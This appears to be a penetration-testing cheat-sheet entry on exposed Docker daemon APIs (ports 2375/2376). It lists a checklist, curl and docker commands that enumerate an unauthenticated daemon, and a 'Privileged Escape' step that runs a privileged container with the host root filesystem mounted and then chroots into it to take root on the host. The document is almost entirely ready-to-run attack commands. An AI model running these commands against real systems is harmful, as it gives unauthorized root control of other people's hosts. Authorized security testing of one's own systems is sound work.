# Docker

**Ports:** 2375, 2376

**Quick Checklist**
- [ ] Port 2375/2376 open?
- [ ] Unauthenticated API?
- [ ] Can spawn privileged container?

```bash
curl http://IP:2375/version
docker -H tcp://IP:2375 ps
docker -H tcp://IP:2375 images
```

**Privileged Escape**
```bash
docker -H tcp://IP:2375 run -it --privileged --pid=host --net=host -v /:/host ubuntu /bin/bash
chroot /host /bin/bash
```
